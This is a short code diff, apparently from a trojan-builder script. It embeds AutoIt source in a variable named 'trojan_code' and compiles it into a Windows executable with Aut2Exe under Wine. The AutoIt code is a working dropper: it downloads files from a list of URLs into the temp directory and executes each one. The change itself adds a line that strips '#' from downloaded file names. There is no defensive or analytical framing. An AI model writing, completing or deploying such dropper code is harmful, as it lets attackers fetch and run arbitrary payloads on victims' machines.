@@ -9,16 +9,15 @@ AUT2EXE = "/root/.wine/drive_c/Program Files (x86)/AutoIt3/Aut2Exe/Aut2exe.exe"
 trojan_code = """
 #include <StaticConstants.au3>
 #include <WindowsConstants.au3>
-
 Local $urlsArray = StringSplit($urls, ",", 2 )
 For $url In $urlsArray
 	$sFile = _DownloadFile($url)
 	shellExecute($sFile)
 Next
-
 Func _DownloadFile($sURL)
     Local $hDownload, $sFile
     $sFile = StringRegExpReplace($sURL, "^.*/", "")
+    $sFile = StringReplace($sFile, "#", "")
     $sDirectory = @TempDir & $sFile
     $hDownload = InetGet($sURL, $sDirectory, 17, 1)
     InetClose($hDownload)
